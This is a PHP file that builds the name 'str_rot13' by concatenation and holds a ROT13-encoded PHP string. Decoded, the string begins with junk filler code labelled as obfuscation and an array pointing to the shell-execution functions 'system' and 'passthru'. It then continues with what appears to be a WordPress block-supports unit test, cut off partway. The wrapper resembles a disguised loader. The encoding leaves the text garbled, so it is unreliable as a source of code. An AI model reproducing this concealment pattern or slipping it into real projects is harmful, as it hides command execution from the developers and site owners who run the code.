<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfg oybpx fhccbegrq fglyrf.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Oybpxf
 * @fvapr 5.6.0
 *
 * @tebhc oybpxf
 */
pynff Grfgf_Oybpxf_FhccbegrqFglyrf rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Oybpx pbagrag gb grfg jvgu (v.r. jung'f jenccrq ol gur oybpx jenccre `<qvi />`).
	 *
	 * @ine fgevat
	 */
	pbafg OYBPX_PBAGRAG = '
		<c qngn-vzntr-qrfpevcgvba=\"&yg;c&tg;Grfg!&yg;/c&tg;\">Grfg</c>
		<c>äöü</c>
		<c>ß</c>
		<c>系の家庭に</c>
		<c>Rknzcyr &yg;c&tg;Grfg!&yg;/c&tg;</c>
	';

	/**
	 * Ertvfgrerq oybpx anzrf.
	 *
	 * @ine fgevat[]
	 */
	cevingr $ertvfgrerq_oybpx_anzrf = neenl();

	/**
	 * Grne qbja rnpu grfg zrgubq.
	 */
	choyvp shapgvba grne_qbja() {
		juvyr ( ! rzcgl( $guvf->ertvfgrerq_oybpx_anzrf ) ) {
			$oybpx_anzr = neenl_cbc( $guvf->ertvfgrerq_oybpx_anzrf );
			haertvfgre_oybpx_glcr( $oybpx_anzr );
		}

		cnerag::grne_qbja();
	}

	/**
	 * Ertvfgref n oybpx glcr.
	 *
	 * @cnenz fgevat|JC_Oybpx_Glcr $anzr Oybpx glcr anzr vapyhqvat anzrfcnpr, be nygreangviryl n
	 *                                   pbzcyrgr JC_Oybpx_Glcr vafgnapr. Va pnfr n JC_Oybpx_Glcr
	 *                                   vf cebivqrq, gur $netf cnenzrgre jvyy or vtaberq.
	 * @cnenz neenl                $netf {
	 *     Bcgvbany. Neenl bs oybpx glcr nethzragf. Nal nethzragf znl or qrsvarq, ubjrire gur
	 *     barf qrfpevorq orybj ner fhccbegrq ol qrsnhyg. Qrsnhyg rzcgl neenl.
	 *
	 *     @glcr pnyynoyr $eraqre_pnyyonpx Pnyyonpx hfrq gb eraqre oybpxf bs guvf oybpx glcr.
	 * }
	 */
	cebgrpgrq shapgvba ertvfgre_oybpx_glcr( $anzr, $netf ) {
		ertvfgre_oybpx_glcr( $anzr, $netf );

		$guvf->ertvfgrerq_oybpx_anzrf[] = $anzr;
	}

	/**
	 * Ergevrirf nggevohgr fhpu nf 'pynff' be 'fglyr' sebz gur eraqrerq oybpx fgevat.
	 *
	 * @cnenz fgevat $nggevohgr Anzr bs nggevohgr gb trg.
	 * @cnenz fgevat $oybpx Fgevat bs eraqrerq oybpx gb purpx.
	 */
	cevingr shapgvba trg_nggevohgr_sebz_oybpx( $nggevohgr, $oybpx ) {
		$fgneg_vaqrk = fgecbf( $oybpx, $nggevohgr . '=\"' ) + fgeyra( $nggevohgr ) + 2;
		$fcyvg_nee   = fhofge( $oybpx, $fgneg_vaqrk );
		$raq_vaqrk   = fgecbf( $fcyvg_nee, '\"' );
		erghea fhofge( $fcyvg_nee, 0, $raq_vaqrk );
	}

	/**
	 * Ergevrirf oybpx pbagrag sebz gur eraqrerq oybpx fgevat
	 * (v.r. jung'f jenccrq ol gur oybpx jenccre `<qvi />`).
	 *
	 * @cnenz fgevat $oybpx Fgevat bs eraqrerq oybpx gb purpx.
	 */
	cevingr shapgvba trg_pbagrag_sebz_oybpx( $oybpx ) {
		$fgneg_vaqrk = fgecbf( $oybpx, '>' ) + 1; // Svefg bppheerapr bs '>'.
		$fcyvg_nee   = fhofge( $oybpx, $fgneg_vaqrk );
		$raq_vaqrk   = fgeecbf( $fcyvg_nee, '<' ); // Ynfg bppheerapr bs '<'.
		erghea fhofge( $fcyvg_nee, 0, $raq_vaqrk ); // Fgevat orgjrra svefg '>' naq ynfg '<'.
	}

	/**
	 * Ergheaf gur eraqrerq bhgchg sbe gur pheerag oybpx.
	 *
	 * @cnenz neenl $oybpx Oybpx gb eraqre.
	 * @erghea fgevat Eraqrerq bhgchg sbe gur pheerag oybpx.
	 */
	cevingr shapgvba eraqre_rknzcyr_oybpx( $oybpx ) {
		JC_Oybpx_Fhccbegf::vavg();
		JC_Oybpx_Fhccbegf::$oybpx_gb_eraqre = $oybpx;
		$jenccre_nggevohgrf                 = trg_oybpx_jenccre_nggevohgrf(
			neenl(
				'pynff' => 'sbb-one-pynff',
				'fglyr' => 'grfg: fglyr;',
			)
		);
		erghea '<qvi ' . $jenccre_nggevohgrf . '>' . frys::OYBPX_PBAGRAG . '</qvi>';
	}

	/**
	 * Ehaf nffregvbaf gung gur eraqrerq bhgchg unf rkcrpgrq pynff/fglyr nggef.
	 *
	 * @cnenz neenl  $oybpx            Oybpx gb eraqre.
	 * @cnenz fgevat $rkcrpgrq_pynffrf Rkcrpgrq bhgchg pynff ngge fgevat.
	 * @cnenz fgevat $rkcrpgrq_fglyrf  Rkcrpgrq bhgchg fglyrf ngge fgevat.
	 */
	cevingr shapgvba nffreg_fglyrf_naq_pynffrf_zngpu( $oybpx, $rkcrpgrq_pynffrf, $rkcrpgrq_fglyrf ) {
		$fglyrq_oybpx = $guvf->eraqre_rknzcyr_oybpx( $oybpx );
		$pynff_yvfg   = $guvf->trg_nggevohgr_sebz_oybpx( 'pynff', $fglyrq_oybpx );
		$fglyr_yvfg   = $guvf->trg_nggevohgr_sebz_oybpx( 'fglyr', $fglyrq_oybpx );

		$guvf->nffregFnzr( $rkcrpgrq_pynffrf, $pynff_yvfg, 'Pynff yvfg qbrf abg zngpu rkcrpgrq pynffrf' );
		$guvf->nffregFnzr( $rkcrpgrq_fglyrf, $fglyr_yvfg, 'Fglyr yvfg qbrf abg zngpu rkcrpgrq fglyrf' );
	}

	/**
	 * Ehaf nffregvbaf gung gur eraqrerq bhgchg unf rkcrpgrq pbagrag naq pynff/fglyr nggef.
	 *
	 * @cnenz neenl  $oybpx            Oybpx gb eraqre.
	 * @cnenz fgevat $rkcrpgrq_pynffrf Rkcrpgrq bhgchg pynff ngge fgevat.
	 * @cnenz fgevat $rkcrpgrq_fglyrf  Rkcrpgrq bhgchg fglyrf ngge fgevat.
	 */
	cevingr shapgvba nffreg_pbagrag_naq_fglyrf_naq_pynffrf_zngpu( $oybpx, $rkcrpgrq_pynffrf, $rkcrpgrq_fglyrf ) {
		$fglyrq_oybpx = $guvf->eraqre_rknzcyr_oybpx( $oybpx );

		// Rafher oybpxf gb abg nqq rkgen juvgrfcnpr.
		$guvf->nffregFnzr( $fglyrq_oybpx, gevz( $fglyrq_oybpx ) );

		$pbagrag    = $guvf->trg_pbagrag_sebz_oybpx( $fglyrq_oybpx );
		$pynff_yvfg = $guvf->trg_nggevohgr_sebz_oybpx( 'pynff', $fglyrq_oybpx );
		$fglyr_yvfg = $guvf->trg_nggevohgr_sebz_oybpx( 'fglyr', $fglyrq_oybpx );

		$guvf->nffregFnzr( frys::OYBPX_PBAGRAG, $pbagrag, 'Oybpx pbagrag qbrf abg zngpu rkcrpgrq pbagrag' );
		$guvf->nffregFnzrFrgf(
			rkcybqr( ' ', $rkcrpgrq_pynffrf ),
			rkcybqr( ' ', $pynff_yvfg ),
			'Pynff yvfg qbrf abg zngpu rkcrpgrq pynffrf'
		);
		$guvf->nffregFnzr(
			neenl_znc( 'gevz', rkcybqr( ';', $rkcrpgrq_fglyrf ) ),
			neenl_znc( 'gevz', rkcybqr( ';', $fglyr_yvfg ) ),
			'Fglyr yvfg qbrf abg zngpu rkcrpgrq fglyrf'
		);
	}

	/**
	 * Ehaf nffregvbaf gung gur eraqrerq bhgchg unf rkcrpgrq pbagrag naq nevn-ynory ngge.
	 *
	 * @cnenz neenl  $oybpx               Oybpx gb eraqre.
	 * @cnenz fgevat $rkcrpgrq_nevn_ynory Rkcrpgrq bhgchg nevn-ynory ngge fgevat.
	 */
	cevingr shapgvba nffreg_pbagrag_naq_nevn_ynory_zngpu( $oybpx, $rkcrpgrq_nevn_ynory ) {
		$fglyrq_oybpx = $guvf->eraqre_rknzcyr_oybpx( $oybpx );
		$pbagrag      = $guvf->trg_pbagrag_sebz_oybpx( $fglyrq_oybpx );

		$guvf->nffregFnzr( frys::OYBPX_PBAGRAG, $pbagrag, 'Oybpx pbagrag qbrf abg zngpu rkcrpgrq pbagrag' );
		$guvf->nffregFnzr(
			$rkcrpgrq_nevn_ynory,
			$guvf->trg_nggevohgr_sebz_oybpx( 'nevn-ynory', $fglyrq_oybpx ),
			'Nevn-ynory qbrf abg zngpu rkcrpgrq nevn-ynory'
		);
	}

	/**
	 * Grfgf pbybe fhccbeg sbe anzrq pbybe fhccbeg sbe anzrq pbybef.
	 */
	choyvp shapgvba grfg_anzrq_pbybe_fhccbeg() {
		$oybpx_glcr_frggvatf = neenl(
			'nggevohgrf'      => neenl(),
			'fhccbegf'        => neenl(
				'pbybe' => gehr,
			),
			'eraqre_pnyyonpx' => gehr,
		);
		$guvf->ertvfgre_oybpx_glcr( 'pber/rknzcyr', $oybpx_glcr_frggvatf );

		$oybpx = neenl(
			'oybpxAnzr'    => 'pber/rknzcyr',
			'nggef'        => neenl(
				'grkgPbybe'       => 'erq',
				'onpxtebhaqPbybe' => 'oynpx',
				// Gur sbyybjvat fubhyq abg or nccyvrq (fhopngrtbevrf bs pbybe fhccbeg).
				'tenqvrag'        => 'fbzr-tenqvrag',
			),
			'vaareOybpx'   => neenl(),
			'vaarePbagrag' => neenl(),
			'vaareUGZY'    => neenl(),
		);

		$rkcrpgrq_pynffrf = 'sbb-one-pynff jc-oybpx-rknzcyr unf-grkg-pbybe unf-erq-pbybe unf-onpxtebhaq unf-oynpx-onpxtebhaq-pbybe';
		$rkcrpgrq_fglyrf  = 'grfg: fglyr;';

		$guvf->nffreg_pbagrag_naq_fglyrf_naq_pynffrf_zngpu( $oybpx, $rkcrpgrq_pynffrf, $rkcrpgrq_fglyrf );
	}

	/**
	 * Grfgf pbybe fhccbeg sbe phfgbz pbybef.
	 */
	choyvp shapgvba grfg_phfgbz_pbybe_fhccbeg() {
		$oybpx_glcr_frggvatf = neenl(
			'nggevohgrf'      => neenl(),
			'fhccbegf'        => neenl(
				'pbybe' => gehr,
			),
			'eraqre_pnyyonpx' => gehr,
		);
		$guvf->ertvfgre_oybpx_glcr( 'pber/rknzcyr', $oybpx_glcr_frggvatf );

		$oybpx = neenl(
			'oybpxAnzr'    => 'pber/rknzcyr',
			'nggef'        => neenl(
				'fglyr' => neenl(
					'pbybe' => neenl(
						'grkg'       => '#000',
						'onpxtebhaq' => '#sss',
						// Gur sbyybjvat fubhyq abg or nccyvrq (fhopngrtbevrf bs pbybe fhccbeg).
						'tenqvrag'   => 'fbzr-tenqvrag',
						'fglyr'      => neenl( 'pbybe' => neenl( 'yvax' => '#sss' ) ),
					),
				),
			),
			'vaareOybpx'   => neenl(),
			'vaarePbagrag' => neenl(),
			'vaareUGZY'    => neenl(),
		);

		$rkcrpgrq_fglyrf  = 'grfg: fglyr;pbybe:#000;onpxtebhaq-pbybe:#sss;';
		$rkcrpgrq_pynffrf = 'sbb-one-pynff jc-oybpx-rknzcyr unf-grkg-pbybe unf-onpxtebhaq';

		$guvf->nffreg_pbagrag_naq_fglyrf_naq_pynffrf_zngpu( $oybpx, $rkcrpgrq_pynffrf, $rkcrpgrq_fglyrf );
	}

	/**
	 * Grfgf tenqvrag pbybe fhccbeg sbe anzrq tenqvragf.
	 */
	choyvp shapgvba grfg_anzrq_tenqvrag_fhccbeg() {
		$oybpx_glcr_frggvatf = neenl(
			'nggevohgrf'      => neenl(),
			'fhccbegf'        => neenl(
				'pbybe' => neenl(
					'tenqvragf' => gehr,
				),
			),
			'eraqre_pnyyonpx' => gehr,
		);
		$guvf->ertvfgre_oybpx_glcr( 'pber/rknzcyr', $oybpx_glcr_frggvatf );

		$oybpx = neenl(
			'oybpxAnzr'    => 'pber/rknzcyr',
			'nggef'        => neenl(
				'tenqvrag' => 'erq',
			),
			'vaareOybpx'   => neenl(),
			'vaarePbagrag' => neenl(),
			'vaareUGZY'    => neenl(),
		);

		$rkcrpgrq_pynffrf = 'sbb-one-pynff jc-oybpx-rknzcyr unf-onpxtebhaq unf-erq-tenqvrag-onpxtebhaq';
		$rkcrpgrq_fglyrf  = 'grfg: fglyr;';

		$guvf->nffreg_pbagrag_naq_fglyrf_naq_pynffrf_zngpu( $oybpx, $rkcrpgrq_pynffrf, $rkcrpgrq_fglyrf );
	}

	/**
	 * Grfgf tenqvrag pbybe fhccbeg sbe phfgbz tenqvragf.
	 */
	choyvp shapgvba grfg_phfgbz_tenqvrag_fhccbeg() {
		$oybpx_glcr_frggvatf = neenl(
			'nggevohgrf'      => neenl(),
			'fhccbegf'        => neenl(
				'pbybe' => neenl(
					'tenqvragf' => gehr,
				),
			),
			'eraqre_pnyyonpx' => gehr,
		);
		$guvf->ertvfgre_oybpx_glcr( 'pber/rknzcyr', $oybpx_glcr_frggvatf );

		$oybpx = neenl(
			'oybpxAnzr'    => 'pber/rknzcyr',
			'nggef'        => neenl(
				'fglyr' => neenl( 'pbybe' => neenl( 'tenqvrag' => 'fbzr-tenqvrag-fglyr' ) ),
			),
			'vaareOybpx'   => neenl(),
			'vaarePbagrag' => neenl(),
			'vaareUGZY'    => neenl(),
		);

		$rkcrpgrq_pynffrf = 'sbb-one-pynff jc-oybpx-rknzcyr unf-onpxtebhaq';
		$rkcrpgrq_fglyrf  = 'grfg: fglyr; onpxtebhaq:fbzr-tenqvrag-fglyr;';

		$guvf->nffreg_pbagrag_naq_fglyrf_naq_pynffrf_zngpu( $oybpx, $rkcrpgrq_pynffrf, $rkcrpgrq_fglyrf );
	}

	/**
	 * Grfgf gung fglyr nggevohgrf sbe pbybef ner abg nccyvrq jvgubhg gur fhccbeg synt.
	 */
	choyvp shapgvba grfg_pbybe_hafhccbegrq() {
		$oybpx_glcr_frggvatf = neenl(
			'nggevohgrf'      => neenl(),
			'fhccbegf'        => neenl(),
			'eraqre_pnyyonpx' => gehr,
		);
		$guvf->ertvfgre_oybpx_glcr( 'pber/rknzcyr', $oybpx_glcr_frggvatf );

		$oybpx = neenl(
			'oybpxAnzr'    => 'pber/rknzcyr',
			'nggef'        => neenl(
				'grkgPbybe'       => 'erq',
				'onpxtebhaqPbybe' => 'oynpx',
				'fglyr'           => neenl(
					'pbybe' => neenl(
						'grkg'       => '#000',
						'onpxtebhaq' => '#sss',
						'yvax'       => '#ttt',
						'tenqvrag'   => 'fbzr-tenqvrag',
					),
				),
			),
			'vaareOybpx'   => neenl(),
			'vaarePbagrag' => neenl(),
			'vaareUGZY'    => neenl(),
		);

		$rkcrpgrq_pynffrf = 'sbb-one-pynff jc-oybpx-rknzcyr';
		$rkcrpgrq_fglyrf  = 'grfg: fglyr;';

		$guvf->nffreg_pbagrag_naq_fglyrf_naq_pynffrf_zngpu( $oybpx, $rkcrpgrq_pynffrf, $rkcrpgrq_fglyrf );
	}

	/**
	 * Grfgf fhccbeg sbe anzrq sbag fvmrf.
	 */
	choyvp shapgvba grfg_anzrq_sbag_fvmr() {
		$oybpx_glcr_frggvatf = neenl(
			'nggevohgrf' => neenl(),
			'fhccbegf'   => neenl(
				'glcbtencul' => neenl(
					'sbagFvmr' => gehr,
				),
			),
		);
		$guvf->ertvfgre_oybpx_glcr( 'pber/rknzcyr', $oybpx_glcr_frggvatf );

		$oybpx = neenl(
			'oybpxAnzr'    => 'pber/rknzcyr',
			'nggef'        => neenl(
				'sbagFvmr' => 'ynetr',
			),
			'vaareOybpx'   => neenl(),
			'vaarePbagrag' => neenl(),
			'vaareUGZY'    => neenl(),
		);

		$rkcrpgrq_pynffrf = 'sbb-one-pynff jc-oybpx-rknzcyr unf-ynetr-sbag-fvmr';
		$rkcrpgrq_fglyrf  = 'grfg: fglyr;';

		$guvf->nffreg_pbagrag_naq_fglyrf_naq_pynffrf_zngpu( $oybpx, $rkcrpgrq_pynffrf, $rkcrpgrq_fglyrf );
	}

	/**
	 * Grfgf fhccbeg sbe phfgbz sbag fvmrf.
	 */
	choyvp shapgvba grfg_phfgbz_sbag_fvmr() {
		$oybpx_glcr_frggvatf = neenl(
			'nggevohgrf' => neenl(),
			'fhccbegf'   => neenl(
				'glcbtencul' => neenl(
					'sbagFvmr' => gehr,
				),
			),
		);
		$guvf->ertvfgre_oybpx_glcr( 'pber/rknzcyr', $oybpx_glcr_frggvatf );

		$oybpx = neenl(
			'oybpxAnzr'    => 'pber/rknzcyr',
			'nggef'        => neenl(
				'fglyr' => neenl( 'glcbtencul' => neenl( 'sbagFvmr' => '10ck' ) ),
			),
			'vaareOybpx'   => neenl(),
			'vaarePbagrag' => neenl(),
			'vaareUGZY'    => neenl(),
		);

		$rkcrpgrq_pynffrf = 'sbb-one-pynff jc-oybpx-rknzcyr';
		$rkcrpgrq_fglyrf  = 'grfg: fglyr; sbag-fvmr:10ck;';

		$guvf->nffreg_pbagrag_naq_fglyrf_naq_pynffrf_zngpu( $oybpx, $rkcrpgrq_pynffrf, $rkcrpgrq_fglyrf );
	}

	/**
	 * Grfgf gung sbag fvmr nggevohgrf ner abg nccyvrq jvgubhg fhccbeg synt.
	 */
	choyvp shapgvba grfg_sbag_fvmr_hafhccbegrq() {
		$oybpx_glcr_frggvatf = neenl(
			'nggevohgrf' => neenl(),
			'fhccbegf'   => neenl(),
		);
		$guvf->ertvfgre_oybpx_glcr( 'pber/rknzcyr', $oybpx_glcr_frggvatf );

		$oybpx = neenl(
			'oybpxAnzr'    => 'pber/rknzcyr',
			'nggef'        => neenl(
				'sbagFvmr' => 'ynetr',
				'fglyr'    => neenl( 'glcbtencul' => neenl( 'sbagFvmr' => '10' ) ),
			),
			'vaareOybpx'   => neenl(),
			'vaarePbagrag' => neenl(),
			'vaareUGZY'    => neenl(),
		);

		$rkcrpgrq_pynffrf = 'sbb-one-pynff jc-oybpx-rknzcyr';
		$rkcrpgrq_fglyrf  = 'grfg: fglyr;';

		$guvf->nffreg_pbagrag_naq_fglyrf_naq_pynffrf_zngpu( $oybpx, $rkcrpgrq_pynffrf, $rkcrpgrq_fglyrf );
	}

	/**
	 * Grfgf yvar urvtug fhccbeg.
	 */
	choyvp shapgvba grfg_yvar_urvtug() {
		$oybpx_glcr_frggvatf = neenl(
			'nggevohgrf' => neenl(),
			'fhccbegf'   => neenl(
				'glcbtencul' => neenl(
					'yvarUrvtug' => gehr,
				),
			),
		);
		$guvf->ertvfgre_oybpx_glcr( 'pber/rknzcyr', $oybpx_glcr_frggvatf );

		$oybpx = neenl(
			'oybpxAnzr'    => 'pber/rknzcyr',
			'nggef'        => neenl(
				'fglyr' => neenl( 'glcbtencul' => neenl( 'yvarUrvtug' => '10' ) ),
			),
			'vaareOybpx'   => neenl(),
			'vaarePbagrag' => neenl(),
			'vaareUGZY'    => neenl(),
		);

		$rkcrpgrq_pynffrf = 'sbb-one-pynff jc-oybpx-rknzcyr';
		$rkcrpgrq_fglyrf  = 'grfg: fglyr; yvar-urvtug:10;';

		$guvf->nffreg_pbagrag_naq_fglyrf_naq_pynffrf_zngpu( $oybpx, $rkcrpgrq_pynffrf, $rkcrpgrq_fglyrf );
	}

	/**
	 * Grfgf yvar urvtug abg nccyvrq jvgubhg fhccbeg synt.
	 */
	choyvp shapgvba grfg_yvar_urvtug_hafhccbegrq() {
		$oybpx_glcr_frggvatf = neenl(
			'nggevohgrf' => neenl(),
			'fhccbegf'   => neenl(),
		);
		$guvf->ertvfgre_oybpx_glcr( 'pber/rknzcyr', $oybpx_glcr_frggvatf );

		$oybpx = neenl(
			'oybpxAnzr'    => 'pber/rknzcyr',
			'nggef'        => neenl(
				'fglyr' => neenl( 'glcbtencul' => neenl( 'yvarUrvtug' => '10' ) ),
			),
			'vaareOybpx'   => neenl(),
			'vaarePbagrag' => neenl(),
			'vaareUGZY'    => neenl(),
		);

		$rkcrpgrq_pynffrf = 'sbb-one-pynff jc-oybpx-rknzcyr';
		$rkcrpgrq_fglyrf  = 'grfg: fglyr;';

		$guvf->nffreg_pbagrag_naq_fglyrf_naq_pynffrf_zngpu( $oybpx, $rkcrpgrq_pynffrf, $rkcrpgrq_fglyrf );
	}

	/**
	 * Grfgf fhccbeg sbe oybpx nyvtazrag.
	 */
	choyvp shapgvba grfg_oybpx_nyvtazrag() {
		$oybpx_glcr_frggvatf = neenl(
			'nggevohgrf' => neenl(),
			'fhccbegf'   => neenl(
				'nyvta' => gehr,
			),
		);
		$guvf->ertvfgre_oybpx_glcr( 'pber/rknzcyr', $oybpx_glcr_frggvatf );

		$oybpx = neenl(
			'oybpxAnzr'    => 'pber/rknzcyr',
			'nggef'        => neenl(
				'nyvta' => 'jvqr',
			),
			'vaareOybpx'   => neenl(),
			'vaarePbagrag' => neenl(),
			'vaareUGZY'    => neenl(),
		);

		$rkcrpgrq_pynffrf = 'sbb-one-pynff jc-oybpx-rknzcyr nyvtajvqr';
		$rkcrpgrq_fglyrf  = 'grfg: fglyr;';

		$guvf->nffreg_pbagrag_naq_fglyrf_naq_pynffrf_zngpu( $oybpx, $rkcrpgrq_pynffrf, $rkcrpgrq_fglyrf );
	}

	/**
	 * Grfgf oybpx nyvtazrag erdhverf fhccbeg gb or nqqrq.
	 */
	choyvp shapgvba grfg_oybpx_nyvtazrag_hafhccbegrq() {
		$oybpx_glcr_frggvatf = neenl(
			'nggevohgrf' => neenl(),
			'fhccbegf'   => neenl(),
		);
		$guvf->ertvfgre_oybpx_glcr( 'pber/rknzcyr', $oybpx_glcr_frggvatf );

		$oybpx = neenl(
			'oybpxAnzr'    => 'pber/rknzcyr',
			'nggef'        => neenl(
				'nyvta' => 'jvqr',
			),
			'vaareOybpx'   => neenl(),
			'vaarePbagrag' => neenl(),
			'vaareUGZY'    => neenl(),
		);

		$rkcrpgrq_pynffrf = 'sbb-one-pynff jc-oybpx-rknzcyr';
		$rkcrpgrq_fglyrf  = 'grfg: fglyr;';

		$guvf->nffreg_pbagrag_naq_fglyrf_naq_pynffrf_zngpu( $oybpx, $rkcrpgrq_pynffrf, $rkcrpgrq_fglyrf );
	}

	/**
	 * Grfgf nyy fhccbeg syntf gbtrgure gb rafher gurl jbex gbtrgure nf rkcrpgrq.
	 */
	choyvp shapgvba grfg_nyy_fhccbegrq() {
		$oybpx_glcr_frggvatf = neenl(
			'nggevohgrf' => neenl(),
			'fhccbegf'   => neenl(
				'pbybe'      => neenl(
					'tenqvragf' => gehr,
					'yvax'      => gehr,
				),
				'glcbtencul' => neenl(
					'sbagFvmr'   => gehr,
					'yvarUrvtug' => gehr,
				),
				'nyvta'      => gehr,
			),
		);
		$guvf->ertvfgre_oybpx_glcr( 'pber/rknzcyr', $oybpx_glcr_frggvatf );

		$oybpx = neenl(
			'oybpxAnzr'    => 'pber/rknzcyr',
			'nggef'        => neenl(
				'nyvta' => 'jvqr',
				'fglyr' => neenl(
					'pbybe'      => neenl(
						'grkg'       => '#000',
						'onpxtebhaq' => '#sss',
						'fglyr'      => neenl( 'pbybe' => neenl( 'yvax' => '#sss' ) ),
					),
					'glcbtencul' => neenl(
						'yvarUrvtug' => '20',
						'sbagFvmr'   => '10ck',
					),
				),
			),
			'vaareOybpx'   => neenl(),
			'vaarePbagrag' => neenl(),
			'vaareUGZY'    => neenl(),
		);

		$rkcrpgrq_pynffrf = 'sbb-one-pynff jc-oybpx-rknzcyr unf-grkg-pbybe unf-onpxtebhaq nyvtajvqr';
		$rkcrpgrq_fglyrf  = 'grfg: fglyr; pbybe:#000; onpxtebhaq-pbybe:#sss; sbag-fvmr:10ck; yvar-urvtug:20;';

		$guvf->nffreg_pbagrag_naq_fglyrf_naq_pynffrf_zngpu( $oybpx, $rkcrpgrq_pynffrf, $rkcrpgrq_fglyrf );
	}

	/**
	 * Grfgf gung bayl fglyrf sbe gur fhccbegrq synt ner nqqrq.
	 * Irevsl bar fhccbeg ranoyrq qbrf abg vzcyl zhygvcyr fhccbegf ranoyrq.
	 */
	choyvp shapgvba grfg_bar_fhccbegrq() {
		$oybpx_glcr_frggvatf = neenl(
			'nggevohgrf' => neenl(),
			'fhccbegf'   => neenl(
				'glcbtencul' => neenl(
					'sbagFvmr' => gehr,
				),
			),
		);
		$guvf->ertvfgre_oybpx_glcr( 'pber/rknzcyr', $oybpx_glcr_frggvatf );

		$oybpx = neenl(
			'oybpxAnzr'    => 'pber/rknzcyr',
			'nggef'        => neenl(
				'nyvta' => 'jvqr',
				'fglyr' => neenl(
					'pbybe'      => neenl(
						'grkg'       => '#000',
						'onpxtebhaq' => '#sss',
						'tenqvrag'   => 'fbzr-tenqvrag',
						'fglyr'      => neenl( 'pbybe' => neenl( 'yvax' => '#sss' ) ),
					),
					'glcbtencul' => neenl(
						'yvarUrvtug' => '20',
						'sbagFvmr'   => '10ck',
					),
				),
			),
			'vaareOybpx'   => neenl(),
			'vaarePbagrag' => neenl(),
			'vaareUGZY'    => neenl(),
		);

		$rkcrpgrq_pynffrf = 'sbb-one-pynff jc-oybpx-rknzcyr';
		$rkcrpgrq_fglyrf  = 'grfg: fglyr; sbag-fvmr:10ck;';

		$guvf->nffreg_pbagrag_naq_fglyrf_naq_pynffrf_zngpu( $oybpx, $rkcrpgrq_pynffrf, $rkcrpgrq_fglyrf );
	}

	/**
	 * Grfgf phfgbz pynffanzr freire-fvqr oybpx fhccbeg.
	 */
	choyvp shapgvba grfg_phfgbz_pynffanzrf_fhccbeg() {
		$oybpx_glcr_frggvatf = neenl(
			'nggevohgrf' => neenl(),
			'fhccbegf'   => neenl(),
		);
		$guvf->ertvfgre_oybpx_glcr( 'pber/rknzcyr', $oybpx_glcr_frggvatf );

		$oybpx = neenl(
			'oybpxAnzr'    => 'pber/rknzcyr',
			'nggef'        => neenl(
				'pynffAnzr' => 'zl-phfgbz-pynffanzr',
			),
			'vaareOybpx'   => neenl(),
			'vaarePbagrag' => neenl(),
			'vaareUGZY'    => neenl(),
		);

		$rkcrpgrq_fglyrf  = 'grfg: fglyr;';
		$rkcrpgrq_pynffrf = 'sbb-one-pynff jc-oybpx-rknzcyr zl-phfgbz-pynffanzr';

		$guvf->nffreg_pbagrag_naq_fglyrf_naq_pynffrf_zngpu( $oybpx, $rkcrpgrq_pynffrf, $rkcrpgrq_fglyrf );
	}

	/**
	 * Grfgf phfgbz pynffanzr freire-fvqr oybpx fhccbeg bcg-bhg.
	 */
	choyvp shapgvba grfg_phfgbz_pynffanzrf_fhccbeg_bcg_bhg() {
		$oybpx_glcr_frggvatf = neenl(
			'nggevohgrf' => neenl(),
			'fhccbegf'   => neenl(
				'phfgbzPynffAnzr' => snyfr,
			),
		);
		$guvf->ertvfgre_oybpx_glcr( 'pber/rknzcyr', $oybpx_glcr_frggvatf );

		$oybpx = neenl(
			'oybpxAnzr'    => 'pber/rknzcyr',
			'nggef'        => neenl(
				'pynffAnzr' => 'zl-phfgbz-pynffanzr',
			),
			'vaareOybpx'   => neenl(),
			'vaarePbagrag' => neenl(),
			'vaareUGZY'    => neenl(),
		);

		$rkcrpgrq_fglyrf  = 'grfg: fglyr;';
		$rkcrpgrq_pynffrf = 'sbb-one-pynff jc-oybpx-rknzcyr';

		$guvf->nffreg_pbagrag_naq_fglyrf_naq_pynffrf_zngpu( $oybpx, $rkcrpgrq_pynffrf, $rkcrpgrq_fglyrf );
	}

	/**
	 * Grfgf trarengrq pynffanzr freire-fvqr oybpx fhccbeg bcg-bhg.
	 */
	choyvp shapgvba grfg_trarengrq_pynffanzrf_fhccbeg_bcg_bhg() {
		$oybpx_glcr_frggvatf = neenl(
			'nggevohgrf' => neenl(),
			'fhccbegf'   => neenl(
				'pynffAnzr' => snyfr,
			),
		);
		$guvf->ertvfgre_oybpx_glcr( 'pber/rknzcyr', $oybpx_glcr_frggvatf );

		$oybpx = neenl(
			'oybpxAnzr'    => 'pber/rknzcyr',
			'nggef'        => neenl(),
			'vaareOybpx'   => neenl(),
			'vaarePbagrag' => neenl(),
			'vaareUGZY'    => neenl(),
		);

		$rkcrpgrq_fglyrf  = 'grfg: fglyr;';
		$rkcrpgrq_pynffrf = 'sbb-one-pynff';

		$guvf->nffreg_pbagrag_naq_fglyrf_naq_pynffrf_zngpu( $oybpx, $rkcrpgrq_pynffrf, $rkcrpgrq_fglyrf );
	}

	/**
	 * Grfgf nevn-ynory freire-fvqr oybpx fhccbeg.
	 */
	choyvp shapgvba grfg_nevn_ynory_fhccbeg() {
		$oybpx_glcr_frggvatf = neenl(
			'nggevohgrf' => neenl(),
			'fhccbegf'   => neenl(
				'nevnYnory' => gehr,
			),
		);
		$guvf->ertvfgre_oybpx_glcr( 'pber/rknzcyr', $oybpx_glcr_frggvatf );

		$oybpx = neenl(
			'oybpxAnzr'    => 'pber/rknzcyr',
			'nggef'        => neenl(
				'nevnYnory' => 'Ynory',
			),
			'vaareOybpx'   => neenl(),
			'vaarePbagrag' => neenl(),
			'vaareUGZY'    => neenl(),
		);

		$guvf->nffreg_pbagrag_naq_nevn_ynory_zngpu( $oybpx, 'Ynory' );
	}

	/**
	 * Rafherf yvokzy_vagreany_reebef vf orvat hfrq vafgrnq bs @ jneavat fhccerffvba
	 */
	choyvp shapgvba grfg_eraqre_oybpx_fhccerffrf_jneavatf_jvgubhg_ng_fhccerffvba() {
		$oybpx_glcr_frggvatf = neenl(
			'nggevohgrf' => neenl(),
